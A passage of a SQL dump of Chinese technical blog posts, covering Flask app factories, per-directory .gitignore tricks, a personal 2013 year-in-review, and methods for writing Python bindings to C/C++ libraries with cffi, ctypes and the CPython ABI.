 DEBUG = False\n    TESTING = True\n    SQLALCHEMY_DATABASE_URI = None\n\n    def setUp(self):\n        self.app = create_app()\n        self.app.config.from_object(self)\n        self.client = self.app.test_client()\n\n    def test_app(self):\n        @self.app.route(''/test/<int:id_>'')\n        def my_view(id_):\n            return ''#%d'' % id_\n        resp = self.client.get(''/test/42'')\n        self.assertEqual(resp.data, ''#42'')\n\n    def test_home(self):\n        resp = self.client.get(''/'')\n        self.assertIn(''Welcome'', resp.data)\n\n在上面的例子中，我为了测试给 App 新挂载了一个 View 函数。这是很常见的一个测试需求。但是如果 Flask App 实例是单例的，这种做法就会“弄脏”下一个测试的运行。更加麻烦的是，上述例子中如果 test_home 在 test_app 之前运行了，Flask 的开发者防御机制会认为这是一个“已经开始处理 Web 请求了，又挂载了视图” [8] 的失误，从而抛出 RuntimeError。\n所以除非是应用简单到不需要 Web 层测试，否则还是尽量使用 App Factory 模式比较好。况且配合 Blueprint 的情况下，App Factory 还能帮助我们良好地组织应用结构：\nhappytree/app.pyfrom flask import Flask\nfrom werkzeug.utils import import_string\n\nextensions = [\n    ''happytree.ext:db'',\n    ''happytree.ext:login_manager'',\n]\nblueprints = [\n    ''happytree.views:bp'',\n]\n\n\ndef create_app():\n    app = Flask(__name__)\n    for ext_name in extensions:\n        ext = import_string(ext_name)\n        ext.init_app(app)\n    for bp_name in blueprints:\n        bp = import_string(bp_name)\n        app.register_blueprint()\n    return app\n\n这样就能彻底摆脱 app.py 和 View 模块“互相 Import”的纠结了。\n好吧其实这一节和 Context 没啥关系……\n\n\n拖延不好\n这篇文章动笔开始写是 6 月 21 日，到今天发布出来，已经过去了整整一个月。而事实上我开始列提纲准备写这篇文章已经是三四月份的事情了。\n_(:з」∠)_\n\n\n\n[1]Flask 文档对 Application Context 和 Request Context 作出了详尽的解释；\n\n\n\n\n\n[2]通过访问 flask.current_app；\n\n\n\n\n\n[3]通过访问 flask.request；\n\n\n\n\n\n[4]Flask(Werkzeug) 的 Context 基于 Thread Local 和代理模式实现，只要身处 Context 中就能用近似访问全局变量的的方式访问到上下文信息，例如 flask.current_app 和 flask.request；Django 和 Tornado 则将上下文封装在对象中，只有明确获取了相关上下文对象才能访问其中的信息，例如在视图函数中或按照规定模板实现的 Middleware 中；\n\n\n\n\n\n[5]基于 Flask 的 Web 应用可以在 Gevent 或 Eventlet 异步网络库 patch 过的 Python 环境中正常工作。这二者都使用 Greenlet 而不是系统线程作为调度单元，而 Werkzeug 考虑到了这点，在 Greenlet 可用时用 Greenlet ID 代替线程 ID。\n\n\n\n\n\n[6]Python 的对象方法是 Descriptior 实现的，所以方法就是一种属性；而 Python 的二元操作可以用双下划线开头和结尾的一系列协议，所以 foo + bar 等同于 foo.__add__(bar)，本质还是属性访问。\n\n\n\n\n\n[7]Flask-Script 是一个用来写 manage.py 管理脚本的 Flask 扩展，用它运行的任务会在开始前自动推入 App Context。将来这个“运行任务”的功能将被整合到 Flask 内部。\n\n\n\n\n\n[8]详见 Flask 源码中的 setup_method 装饰器。\n\n\n', NULL, NULL, NULL);
INSERT INTO `post` (`id`, `url`, `title`, `content`, `created_at`, `blog_id`, `updated_at`, `published_at`, `hide`, `keywords`, `clicks`, `recommend`, `pure_content`, `need_analysis`, `published_at_exceed`, `updated_at_exceed`) VALUES
(47, 'https://blog.tonyseek.com/post/git-ignore-directories/', 'Git 忽略某个目录', '<p>有时候我们在给开源项目贡献代码的时候，会使用自己熟悉的工具链。比如 Python 项目，我可能就用 <a class="reference external" href="https://tox.readthedocs.org/en/latest">tox</a> 来构建发型包并运行单元测试。或者有不习惯用 <a class="reference external" href="https://github.com/yyuu/pyenv">pyenv</a> 或者 <a class="reference external" href="https://virtualenvwrapper.readthedocs.org/en/latest/">virtualenvwrapper</a> 的同学，就可能直接使用 <a class="reference external" href="https://virtualenv.readthedocs.org/en/latest/">virtualenv</a> 命令创建一个隔离的环境。</p>\n\n<div class="section" id="id1">\n<h2>忽略但不提交</h2>\n<p>于是问题就来了，这些工具链都是会在项目目录中生成自己的工作目录的。 <a class="reference external" href="https://tox.readthedocs.org/en/latest">tox</a> 有 <tt class="docutils literal">.tox</tt> 目录， <a class="reference external" href="https://virtualenv.readthedocs.org/en/latest/">virtualenv</a> 有 <tt class="docutils literal">venv</tt> 目录。这些目录对版本控制来说应该被忽略，但我们不是项目的主人，只是贡献者，直接修改项目根目录下的 <tt class="docutils literal">.gitignore</tt> 会引起处女座的项目主人严重不适。</p>\n<p>这个时候有个取巧的办法：进入这个要被忽略的目录，在目录下创建一个 <tt class="docutils literal">.gitignore</tt> 文件，然后里面写 <tt class="docutils literal">*</tt> 。这样这个目录就会被 git 默默忽略，而且不需要修改项目根目录的 <tt class="docutils literal">.gitignore</tt> 。</p>\n</div>\n<div class="section" id="id2">\n<h2>提交且要忽略</h2>\n<p>类似的一个问题是项目根目录下可能有 <tt class="docutils literal">logs</tt> 一类的目录，我们希望他人把仓库 <tt class="docutils literal">clone</tt> 下来的时候能够已经携带了这个目录，但又不希望让这个目录中的日志文件进版本库。</p>\n<p>之前看到一些项目用了一种比较 ugly 的做法：在 <tt class="docutils literal">logs</tt> 下建立一个\n<tt class="docutils literal">.gitkeep</tt> 空文件（git 无法版本控制没有任何文件的空目录），然后再在项目根目录``.gitignore`` 中写入一行 <tt class="docutils literal">logs/*</tt> 。</p>\n<p>其实完全没有这样的必要，我们可以直接在 <tt class="docutils literal">logs</tt> 里面写一个 <tt class="docutils literal">.gitignore</tt> 文件，内容如下：</p>\n<figure class="code"><figcaption><span>.gitignore</span></figcaption><div class="highlight"><pre> *\n !.gitignore\n</pre></div>\n</figure><p>然后 <tt class="docutils literal">git add <span class="pre">logs/.gitignore</span> &amp;&amp; git commit</tt> 提交。</p>\n<p>这个 <tt class="docutils literal">.gitignore</tt> 既留住了空目录，又声明了忽略。而且某天如果要删除 <tt class="docutils literal">logs</tt> 目录，直接 <tt class="docutils literal">git rm <span class="pre">-r</span> logs</tt> 即可，无需再修改项目根目录下的 <tt class="docutils literal">.gitignore</tt> 。</p>\n</div>', '2014-11-06 23:43:08', 6, '2014-03-27 03:45:00', '2014-03-27 03:45:00', 0, '[["gitignore", 0.5747484376394231], ["\\u76ee\\u5f55", 0.4214363733467308], ["logs", 0.4023239063475961], ["\\u6839\\u76ee\\u5f55", 0.30774195584855774], ["git", 0.28737421881971154], ["\\u9879\\u76ee", 0.2582266072755769], ["\\u5ffd\\u7565", 0.22259217579923077], ["tox", 0.17242453129182692], ["\\u6587\\u4ef6", 0.14811908400336538], ["\\u7a7a\\u76ee\\u5f55", 0.13366036203846154], ["\\u7248\\u672c\\u63a7\\u5236", 0.1269954853019231], ["virtualenv", 0.1149496875278846], ["\\u63d0\\u4ea4", 0.1085185197703846], ["\\u8fd9\\u4e2a", 0.10290360878394231], ["\\u4fee\\u6539", 0.09741209816134613], ["\\u76f4\\u63a5", 0.09305902565], ["\\u7136\\u540e", 0.0693363553195673], ["\\u4e00\\u4e2a", 0.06772959067620192], ["\\u521b\\u5efa", 0.06666123509778846], ["\\u6211\\u4eec", 0.06521765321134615]]', NULL, NULL, '有时候我们在给开源项目贡献代码的时候，会使用自己熟悉的工具链。比如 Python 项目，我可能就用 tox 来构建发型包并运行单元测试。或者有不习惯用 pyenv 或者 virtualenvwrapper 的同学，就可能直接使用 virtualenv 命令创建一个隔离的环境。\n\n\n忽略但不提交\n于是问题就来了，这些工具链都是会在项目目录中生成自己的工作目录的。 tox 有 .tox 目录， virtualenv 有 venv 目录。这些目录对版本控制来说应该被忽略，但我们不是项目的主人，只是贡献者，直接修改项目根目录下的 .gitignore 会引起处女座的项目主人严重不适。\n这个时候有个取巧的办法：进入这个要被忽略的目录，在目录下创建一个 .gitignore 文件，然后里面写 * 。这样这个目录就会被 git 默默忽略，而且不需要修改项目根目录的 .gitignore 。\n\n\n提交且要忽略\n类似的一个问题是项目根目录下可能有 logs 一类的目录，我们希望他人把仓库 clone 下来的时候能够已经携带了这个目录，但又不希望让这个目录中的日志文件进版本库。\n之前看到一些项目用了一种比较 ugly 的做法：在 logs 下建立一个\n.gitkeep 空文件（git 无法版本控制没有任何文件的空目录），然后再在项目根目录``.gitignore`` 中写入一行 logs/* 。\n其实完全没有这样的必要，我们可以直接在 logs 里面写一个 .gitignore 文件，内容如下：\n.gitignore *\n !.gitignore\n\n然后 git add logs/.gitignore && git commit 提交。\n这个 .gitignore 既留住了空目录，又声明了忽略。而且某天如果要删除 logs 目录，直接 git rm -r logs 即可，无需再修改项目根目录下的 .gitignore 。\n', NULL, NULL, NULL),
(48, 'https://blog.tonyseek.com/post/the-end-of-2013/', '回顾即将结束的 2013 年', '<p>2013 年已走向尾声，还有一个小时不到新的一年就要来了。这一年对我来说意义非凡，充满了不同的结束，也充满了不同的开始。</p>\n<p>去年偷懒，最后也没写年终总结。2013 年的转折点更多，自己都觉得不记录下来太过分。所以还是流水帐，略记一笔。</p>\n\n<p>年初寒假伊始，和某人在考完试又未回老家之前去了趟广州，总算是见了家长。说来我自己也挺坑爹，回去之前才让爸爸知道我已有女友，弄得爸爸还有点凌乱。某人淑女模式开启，爸爸当然很是喜欢，不仅开启了话痨模式，还小孩子一样带了我们回去看家里的兔子。见面之前某人紧张得不行，见面后总算放下了重石。可惜在家里待到一天不到，我们两人马上又按计划赴中山市。爸爸其实对此很遗憾。我每次回家都是匆匆而回，匆匆而去，很少有被挽留成功的。我也一直有着奇怪的矛盾心理，一方面觉得自己这样刚来便走很让家人难过，另一方面又实在不愿意在家里久居。</p>\n<p>中山一行短短三天，去了一个叫小榄的干净小镇，和深圳的城市气质截然不同。但重要的不是去哪里，而是与谁携手同行吧。后离中山，各回各家，两地隔山隔水，只能电话往来，甚为难熬。实习三个月的分别也没有这般感受，可能是因为在一起时间愈发长了，举手投足都已深入脑海，所以才刻骨铭心吧。</p>\n<p>在老家一个月除了亲戚串门，大部分时间还是在写代码。本科四年即将结束，我也想在毕业设计的机会挑战一下自己，顺便平衡发展技能树，所以没有选择我比较熟悉的 Web 项目开发，而是转而基于 libuv 和 Lua VM 实现了一个 Application Server （类似 Python WSGI Server）。坑多，边跳边填地走了下去。</p>\n<p>三月，与某人在广州相见，同回深圳。之后就开始了最闲的几个月。折腾了很多幺蛾子，睡了很多觉，看了很多电影，零零散散的时间做着毕业设计。</p>\n<p>四月，找到了一份实习工作，在小象网做了两个月 Web 开发，从此也终于是写过 Ruby 的人了，虽然写的很渣。同时也认识了很厉害的 Tech Leader，感觉相比之下自己在许多基础知识方面薄弱的要命。</p>\n<p>六月七月毕业季，到了宿舍搬空那一天才意识到真的要离开了。那种莫名的失落感一下冲了上来，很难受。同学朋友各奔东西，他日再见也不同当年了。</p>\n<p>毕业后就一路奔来北京，算正式成为北漂族一员了吧。刚来那天先到的厂里，看到熟悉的小二楼上只剩下两个人，不由得脑补了去年的小二楼盛况，对比之下更是有种物是人非的感觉。</p>\n<p>转眼到如今，工作已有近半年，也从看什么都陌生进化到了现在闭着眼睛能找到哪个类放在哪个模块。短短数月，踩了许多坑，造了许多轮子，还终于如愿以偿维护了一个能见人的开源项目 <a class="reference external" href="https://github.com/tonyseek/brownant">Brownant</a> 。</p>\n<p>再次异地恋，吵了几次架之后反而愈发知心，哄妹纸的水平日渐提高。某人要准备考研，同时还要面临期末考试，压力很大，至今离会考也只剩下几天了。而这一切所为的，是明年的今天二人能同处一个城市，不再分隔两地。</p>\n<p>曾经说过要为某人学会做双皮奶，如今该技能已得到。曾经说过工作了也要保持阅读，做的很不好。曾经说过要保持作息节奏，结局惨不忍睹。</p>\n<p>工作上，对比去年实习，真实的工作给了我实习无法得到的经验、感悟以及忙碌，同时也在厂里目睹了很多遗憾的变故。我也开始学着去应对这个世界，应对如意的事情和不如意的事情。一个人经历越多就应该会坎坷越多，而我看到了几位历练比我要多好多年的老师仍在以正能量应对着，做他们喜欢做的事情，参加他们喜欢的社区，组织他们喜欢的活动。所以我想我更没有理由因为丑陋的存在而不去喜欢这个世界本身。</p>\n<p>2014 年来了，谁也不知道这将是怎样的一年，但这一年必是值得期待。这一年里，我还想修剪技能树打小怪兽升级，还想朝着让某人幸福的方向继续努力，还想多读几本书（是 <a class="reference external" href="https://www.douban.com/group/buybook/">移山</a> 吧）。当然，也可能有新的坑在等着我跳。但只要是未知的，都还是值得期待的。</p>', '2014-11-06 23:43:08', 6, '2013-12-31 15:16:00', '2013-12-31 15:16:00', 0, '[["\\u67d0\\u4eba", 0.1333484878240421], ["\\u5b9e\\u4e60", 0.0741635995888], ["\\u559c\\u6b22", 0.060027246347578944], ["\\u7238\\u7238", 0.057594469769010524], ["\\u4e00\\u5e74", 0.05574954160473684], ["\\u6bd5\\u4e1a\\u8bbe\\u8ba1", 0.053903433108631583], ["\\u6280\\u80fd", 0.05158317710576842], ["2013", 0.05033586317010526], ["Web", 0.05033586317010526], ["Server", 0.05033586317010526], ["\\u5de5\\u4f5c", 0.04423936149842106], ["\\u5f88\\u591a", 0.04091185407031579], ["\\u5e94\\u5bf9", 0.03938142905368421], ["\\u6108\\u53d1", 0.037239713038442104], ["\\u66fe\\u7ecf", 0.037137337907873685], ["\\u81ea\\u5df1", 0.03708461930042105], ["\\u4e8c\\u697c", 0.0363487136543579], ["\\u5bb6\\u91cc", 0.035960976148926314], ["\\u5382\\u91cc", 0.03566876641271579], ["\\u6240\\u4ee5", 0.03563811999444211]]', NULL, NULL, '2013 年已走向尾声，还有一个小时不到新的一年就要来了。这一年对我来说意义非凡，充满了不同的结束，也充满了不同的开始。\n去年偷懒，最后也没写年终总结。2013 年的转折点更多，自己都觉得不记录下来太过分。所以还是流水帐，略记一笔。\n\n年初寒假伊始，和某人在考完试又未回老家之前去了趟广州，总算是见了家长。说来我自己也挺坑爹，回去之前才让爸爸知道我已有女友，弄得爸爸还有点凌乱。某人淑女模式开启，爸爸当然很是喜欢，不仅开启了话痨模式，还小孩子一样带了我们回去看家里的兔子。见面之前某人紧张得不行，见面后总算放下了重石。可惜在家里待到一天不到，我们两人马上又按计划赴中山市。爸爸其实对此很遗憾。我每次回家都是匆匆而回，匆匆而去，很少有被挽留成功的。我也一直有着奇怪的矛盾心理，一方面觉得自己这样刚来便走很让家人难过，另一方面又实在不愿意在家里久居。\n中山一行短短三天，去了一个叫小榄的干净小镇，和深圳的城市气质截然不同。但重要的不是去哪里，而是与谁携手同行吧。后离中山，各回各家，两地隔山隔水，只能电话往来，甚为难熬。实习三个月的分别也没有这般感受，可能是因为在一起时间愈发长了，举手投足都已深入脑海，所以才刻骨铭心吧。\n在老家一个月除了亲戚串门，大部分时间还是在写代码。本科四年即将结束，我也想在毕业设计的机会挑战一下自己，顺便平衡发展技能树，所以没有选择我比较熟悉的 Web 项目开发，而是转而基于 libuv 和 Lua VM 实现了一个 Application Server （类似 Python WSGI Server）。坑多，边跳边填地走了下去。\n三月，与某人在广州相见，同回深圳。之后就开始了最闲的几个月。折腾了很多幺蛾子，睡了很多觉，看了很多电影，零零散散的时间做着毕业设计。\n四月，找到了一份实习工作，在小象网做了两个月 Web 开发，从此也终于是写过 Ruby 的人了，虽然写的很渣。同时也认识了很厉害的 Tech Leader，感觉相比之下自己在许多基础知识方面薄弱的要命。\n六月七月毕业季，到了宿舍搬空那一天才意识到真的要离开了。那种莫名的失落感一下冲了上来，很难受。同学朋友各奔东西，他日再见也不同当年了。\n毕业后就一路奔来北京，算正式成为北漂族一员了吧。刚来那天先到的厂里，看到熟悉的小二楼上只剩下两个人，不由得脑补了去年的小二楼盛况，对比之下更是有种物是人非的感觉。\n转眼到如今，工作已有近半年，也从看什么都陌生进化到了现在闭着眼睛能找到哪个类放在哪个模块。短短数月，踩了许多坑，造了许多轮子，还终于如愿以偿维护了一个能见人的开源项目 Brownant 。\n再次异地恋，吵了几次架之后反而愈发知心，哄妹纸的水平日渐提高。某人要准备考研，同时还要面临期末考试，压力很大，至今离会考也只剩下几天了。而这一切所为的，是明年的今天二人能同处一个城市，不再分隔两地。\n曾经说过要为某人学会做双皮奶，如今该技能已得到。曾经说过工作了也要保持阅读，做的很不好。曾经说过要保持作息节奏，结局惨不忍睹。\n工作上，对比去年实习，真实的工作给了我实习无法得到的经验、感悟以及忙碌，同时也在厂里目睹了很多遗憾的变故。我也开始学着去应对这个世界，应对如意的事情和不如意的事情。一个人经历越多就应该会坎坷越多，而我看到了几位历练比我要多好多年的老师仍在以正能量应对着，做他们喜欢做的事情，参加他们喜欢的社区，组织他们喜欢的活动。所以我想我更没有理由因为丑陋的存在而不去喜欢这个世界本身。\n2014 年来了，谁也不知道这将是怎样的一年，但这一年必是值得期待。这一年里，我还想修剪技能树打小怪兽升级，还想朝着让某人幸福的方向继续努力，还想多读几本书（是 移山 吧）。当然，也可能有新的坑在等着我跳。但只要是未知的，都还是值得期待的。', NULL, NULL, NULL),
(49, 'https://blog.tonyseek.com/post/make-python-binding-for-c-library/', '为 C/C++ 库定制 Python Binding', '<p>这应该是个非常常见的需求了吧。可能因为性能原因需要自己编写一部分 C 代码，可能因为需要的第三方库是 C/C++ 编写的。</p>\n<p>我遇到这个问题是因为希望将淘宝发的一个切图实现 <a class="reference external" href="https://github.com/exinnet/tclip">tclip</a> 放到 Python 上用。和几个同事都尝试折腾了这个问题，总结出了几种可行的方法。</p>\n\n<div class="section" id="id1">\n<h2>可行的办法</h2>\n<div class="section" id="port-python">\n<h3>直接 port 到 Python 上</h3>\n<p>实现例子: <a class="reference external" href="https://github.com/CNBorn/pytclip">https://github.com/CNBorn/pytclip</a></p>\n<p>tclip 是使用 OpenCV 实现的，所以一个可行的途径是直接使用 OpenCV 的 Python Binding，将逻辑在 Python 中实现一遍。</p>\n<p>所以如果目标库本身代码比较简单，但是用到了第三方 C/C++ 库，可以寻找有没有第三方库的 Python Binding。如果有，可以将逻辑 port 到 Python 上实现。</p>\n<p>优点：</p>\n<ul class="simple">\n<li>编写快，只需要编写 Python 代码，不需要写 C/C++；</li>\n<li>构建过程简单。由于将构建过程推给了第三方 Python Binding，所以直接用 setuptools 内置的依赖管理指向 PyPI 上的包即可。如果源中提供了打包好的依赖，部署环境不需要安装编译器或 foobar-devel 库。</li>\n</ul>\n<p>缺点：</p>\n<ul class="simple">\n<li>视具体情况不同，性能折扣可能比较大；</li>\n<li>而且最终质量依赖第三方 Python Binding 库的质量。如果第三方实现的很多坑，那我们作为使用者就会掉坑；</li>\n<li>跨平台、跨解释器受第三方限制。如果第三方 Python Binding 库只支持 CPython 或 Python 2.x 或只支持某个操作系统，那么我们编写的库也将受到这个限制。</li>\n</ul>\n</div>\n<div class="section" id="cpython-abi">\n<h3>使用 CPython ABI 绑定</h3>\n<p>实现例子: <a class="reference external" href="https://github.com/xtao/tclip">https://github.com/xtao/tclip</a></p>\n<p>这个对 CPython 而言“受官方支持”的做法，大部分库也都会选择这么做。用 C/C++ 编写一个绑定模块并在其中 <tt class="docutils literal">#include &lt;Python.h&gt;</tt> 和定义 <tt class="docutils literal">PyMODINIT_FUNC</tt> ，使用 setuptools 编译后就可以在 Python 中直接 import，非常好用。</p>\n<p>除去直接使用 C/C++ 访问 CPython ABI，借助 Pyrex 或者 Cython 能编码过程进一步简化。使用 Cython 后除了访问 C/C++ 接口处，其他地方就像编写普通 Python 代码。</p>\n<p>优点：</p>\n<ul class="simple">\n<li>CPython 的官方指导做法，适用面广；</li>\n<li>构建过程简单，在 <tt class="docutils literal">setup.py</tt> 中定义好后， <tt class="docutils literal">python setup.py install</tt> 或者 <tt class="docutils literal">pip install foobar</tt> 就可以直接编译扩展并安装到 site-packages 目录。部署环境要求安装编译器，但编译过程不用人为干预。如果在源中打包好，部署环境的编译器也可以省去。</li>\n</ul>\n<p>缺点：</p>\n<ul class="simple">\n<li>仅适用于 CPython，无法适用其它富有潜力的解释器，如 PyPy。</li>\n</ul>\n</div>\n<div class="section" id="ctypes-cffi">\n<h3>使用 ctypes 或者 cffi 绑定</h3>\n<p>实现例子: <a class="reference external" href="https://github.com/tonyseek/python-tclip">https://github.com/tonyseek/python-tclip</a></p>\n<p><a class="reference external" href="http://docs.python.org/dev/library/ctypes.html">ctypes</a> 是 Python 标准库模块，能在运行时载入动态链接库（Windows 平台上的 <tt class="docutils literal">foo.dll</tt> 、Linux/Unix/OSX 平台上的 <tt class="docutils literal">foo.so</tt> ），在 CPython 2.x/3.x 和 PyPy 上均受支持。</p>\n<p><a class="reference external" href="http://cffi.readthedocs.org">cffi</a> 是 PyPy 开发者编写的一套 Python 与 C 的 FII 实现，和 ctypes 类似，但提供了更高层的接口，支持直接内嵌 C 源码，运行时将其编译。cffi 同时支持 CPython 和 PyPy 两种解释器。在 PyPy 中 cffi 是内置的，ctypes 实际上是 cffi 的一个 wrapper。</p>\n<p>其中我个人更推荐使用 cffi，因为它能接受和 setuptools 一样的扩展选项，例如指定 <tt class="docutils literal">include</tt> 路径、 <tt class="docutils literal">library</tt> 路径，方便编译需要外部库支持的 C/C++ 源码。如果配合 <a class="reference external" href="https://github.com/tonyseek/python-tclip/blob/e041c974f409bcc4075121a38d16fda83fe8d9cc/tclip.py#L13-L23">一个简单的函数</a> 调用系统的 <tt class="docutils literal"><span class="pre">pkg-config</span></tt> 来寻找这个路径，就能在不同的平台下不修改参数而直接编译，方便程度不亚于 CPython ABI。</p>\n<p>另外，cffi 支持基础类型到 Python 的自动转换，例如 <tt class="docutils literal">str</tt> 对 <tt class="docutils literal">char *</tt> 、<tt class="docutils literal">int</tt> 对 <tt class="docutils literal">int</tt> 等。用 cffi 产生的接口对于不合法的输入不是一个粗暴的段错误或 core dump 回应，而是抛出 Python 语言级别的可恢复异常，例如 <tt class="docutils literal">TypeError</tt> 。</p>\n<p>一个简单的例子：</p>\n<figure class="code"><div class="highlight"><pre><span class="kn">import</span> <span class="nn">cffi</span>\n\n<span class="n">ffi</span> <span class="o">=</span> <span class="n">cffi</span><span class="o">.</span><span class="n">FFI</span><span class="p">()</span>\n<span class="n">ffi</span><span class="o">.</span><span class="n">cdef</span><span class="p">(</span><span class="s">&quot;&quot;&quot;</span>\n<span class="s">    int hello(char *);</span>\n<span class="s">&quot;&quot;&quot;</span><span class="p">)</span>\n<span class="n">ffi</span><span class="o">.</span><span class="n">verify</span><span class="p">(</span><span class="s">&quot;&quot;&quot;</span>\n<span class="s">    #include &lt;stdio.h&gt;</span>\n<span class="s">    int hello(char *name) { printf(&quot;hello, </span><span class="si">%s</span><span class="s">&quot;, name); return 0; }</span>\n<span class="s">&quot;&quot;&quot;</span><span class="p">)</span>\n\n<span class="k">assert</span> <span class="n">ffi</span><span class="o">.</span><span class="n">hello</span><span class="p">(</span><span class="s">&quot;world&quot;</span><span class="p">)</span> <span class="o">==</span> <span class="mi">0</span>\n</pre></div>\n</figure><p>如果 C 的源码独立成文件，也可以用 <tt class="docutils literal"><span class="pre">ffi.verify(sources=[''foo.c''])</span></tt> 指定。 <tt class="docutils literal">verify</tt> 接受的参数和 setuptools/distutils 的 <tt class="docutils literal">Extension</tt> 类接受的参数是兼容的。</p>\n<p>如果目标代码不是 ANSI C 而是 C++ 的，暴露给 cffi 的接口需要包在 <tt class="docutils literal">extern &quot;C&quot; {}</tt> 内。</p>\n<p>优点：</p>\n<ul class="simple">\n<li>跨解释器兼容，同时支持 CPython 2.x/3.x 和 PyPy；</li>\n<li>开发和部署都非常简单，编译过程由 cffi 库默默完成。</li>\n</ul>\n<p>缺点：</p>\n<ul class="simple">\n<li>由于是运行时编译，所以即使做了安装源的二进制打包，部署环境还是 <strong>必须</strong> 安装编译器和 <tt class="docutils literal"><span class="pre">foobar-devel</span></tt> 库；</li>\n<li>同样由于运行时编译，所以对于频繁运行而每次运行时间又特别短的小脚本来说， <tt class="docutils literal">verify</tt> 的执行有些不“低碳”（对于驻守进程的应用则可以忽略这个开销，因为 <tt class="docutils literal">verify</tt> 只在首次调时编译）。</li>\n</ul>\n</div>\n<div class="section" id="boost-python">\n<h3>基于 boost-python 的封装</h3>\n<p>实现例子：tclip 的例子就没有了。有一个 tesseract 的 Python Binding 实现 tesserwrap， <a class="reference external" href="https://github.com/gregjurman/tesserwrap/blob/3edfbe1942a6ba6983e32564b99442fdae8550c2/tesserwrap/cpp/tesseract_wrap.cpp#L70-L95">早期</a> 使用了这个方法。</p>\n<p>据说性能捉急，坑又多多。所以 tesserwrap 现在也迁移到 <tt class="docutils literal">ctypes</tt> 了。这里就不详述了。</p>\n</div>\n</div>\n<div class="section" id="id4">\n<h2>做出选择</h2>\n<p>我个人来说最推崇的方法是 cffi/ctypes，理由是“跨解释器”。我认为作为一个库实现，对 PyPy 的支持重要程度不亚于对 Python 3.x 的支持。</p>\n<p>我现在发起的开源 Python 库一律对 CPython 2.7、CPython 3.3 和 PyPy latest stable release 提供 CI 保证和维护支持。因为我认为作为维护者，不应该让自己的库成为用户选择优秀解释器的阻碍。cffi/ctypes 很完美地符合了这个要求。</p>\n<p>目前为止，我了解的还有 <a class="reference external" href="http://docs.wand-py.org">Wand</a> （ImageMagick 的 binding）和现行版本的 <a class="reference external" href="https://github.com/gregjurman/tesserwrap">tesserwrap</a> （Tesseract 的 binding）使用了 cffi/ctypes ；此外如果要在 PyPy 下使用 PostgreSQL，选择之一也是 <a class="reference external" href="https://github.com/mvantellingen/psycopg2-ctypes">psycopg2-ctypes</a> 驱动。</p>\n</div>', '2014-11-06 23:43:08', 6, '2013-12-09 22:23:00', '2013-12-09 22:23:00', 0, '[["Python", 0.3681086767755132], ["cffi", 0.26293476912536656], ["CPython", 0.21034781530029326], ["PyPy", 0.15776086147521995], ["ctypes", 0.15776086147521995], ["C++", 0.14023187686686217], ["\\u7f16\\u8bd1", 0.13516930241715544], ["Binding", 0.10517390765014663], ["\\u89e3\\u91ca\\u5668", 0.1011974989372434], ["\\u7b2c\\u4e09\\u65b9", 0.0955047023824047], ["\\u7f16\\u5199", 0.09365953770521994], ["\\u652f\\u6301", 0.08933190092868035], ["ffi", 0.08764492304178886], ["tclip", 0.08764492304178886], ["verify", 0.08764492304178886], ["\\u5b9e\\u73b0", 0.0822885092655132], ["\\u7f16\\u8bd1\\u5668", 0.07508542735073315], ["\\u4f7f\\u7528", 0.07284354746435484], ["int", 0.07011593843343109], ["setuptools", 0.07011593843343109]]', NULL, NULL, '这应该是个非常常见的需求了吧。可能因为性能原因需要自己编写一部分 C 代码，可能因为需要的第三方库是 C/C++ 编写的。\n我遇到这个问题是因为希望将淘宝发的一个切图实现 tclip 放到 Python 上用。和几个同事都尝试折腾了这个问题，总结出了几种可行的方法。\n\n\n可行的办法\n\n直接 port 到 Python 上\n实现例子: https://github.com/CNBorn/pytclip\ntclip 是使用 OpenCV 实现的，所以一个可行的途径是直接使用 OpenCV 的 Python Binding，将逻辑在 Python 中实现一遍。\n所以如果目标库本身代码比较简单，但是用到了第三方 C/C++ 库，可以寻找有没有第三方库的 Python Binding。如果有，可以将逻辑 port 到 Python 上实现。\n优点：\n\n编写快，只需要编写 Python 代码，不需要写 C/C++；\n构建过程简单。由于将构建过程推给了第三方 Python Binding，所以直接用 setuptools 内置的依赖管理指向 PyPI 上的包即可。如果源中提供了打包好的依赖，部署环境不需要安装编译器或 foobar-devel 库。\n\n缺点：\n\n视具体情况不同，性能折扣可能比较大；\n而且最终质量依赖第三方 Python Binding 库的质量。如果第三方实现的很多坑，那我们作为使用者就会掉坑；\n跨平台、跨解释器受第三方限制。如果第三方 Python Binding 库只支持 CPython 或 Python 2.x 或只支持某个操作系统，那么我们编写的库也将受到这个限制。\n\n\n\n使用 CPython ABI 绑定\n实现例子: https://github.com/xtao/tclip\n这个对 CPython 而言“受官方支持”的做法，大部分库也都会选择这么做。用 C/C++ 编写一个绑定模块并在其中 #include <Python.h> 和定义 PyMODINIT_FUNC ，使用 setuptools 编译后就可以在 Python 中直接 import，非常好用。\n除去直接使用 C/C++ 访问 CPython ABI，借助 Pyrex 或者 Cython 能编码过程进一步简化。使用 Cython 后除了访问 C/C++ 接口处，其他地方就像编写普通 Python 代码。\n优点：\n\nCPython 的官方指导做法，适用面广；\n构建过程简单，在 setup.py 中定义好后， python setup.py install 或者 pip install foobar 就可以直接编译扩展并安装到 site-packages 目录。部署环境要求安装编译器，但编译过程不用人为干预。如果在源中打包好，部署环境的编译器也可以省去。\n\n缺点：\n\n仅适用于 CPython，无法适用其它富有潜力的解释器，如 PyPy。\n\n\n\n使用 ctypes 或者 cffi 绑定\n实现例子: https://github.com/tonyseek/python-tclip\nctypes 是 Python 标准库模块，能在运行时载入动态链接库（Windows 平台上的 foo.dll 、Linux/Unix/OSX 平台上的 foo.so ），在 CPython 2.x/3.x 和 PyPy 上均受支持。\ncffi 是 PyPy 开发者编写的一套 Python 与 C 的 FII 实现，和 ctypes 类似，但提供了更高层的接口，支持直接内嵌 C 源码，运行时将其编译。cffi 同时支持 CPython 和 PyPy 两种解释器。在 PyPy 中 cffi 是内置的，ctypes 实际上是 cffi 的一个 wrapper。\n其中我个人更推荐使用 cffi，因为它能接受和 setuptools 一样的扩展选项，例如指定 include 路径、 library 路径，方便编译需要外部库支持的 C/C++ 源码。如果配合 一个简单的函数 调用系统的 pkg-config 来寻找这个路径，就能在不同的平台下不修改参数而直接编译，方便程度不亚于 CPython ABI。\n另外，cffi 支持基础类型到 Python 的自动转换，例如 str 对 char * 、int 对 int 等。用 cffi 产生的接口对于不合法的输入不是一个粗暴的段错误或 core dump 回应，而是抛出 Python 语言级别的可恢复异常，例如 TypeError 。\n一个简单的例子：\nimport cffi\n\nffi = cffi.FFI()\nffi.cdef("""\n    int hello(char *);\n""")\nffi.verify("""\n    #include <stdio.h>\n    int hello(char *name) { printf("hello, %s", name); return 0; }\n""")\n\nassert ffi.hello("world") == 0\n\n如果 C 的源码独立成文件，也可以用 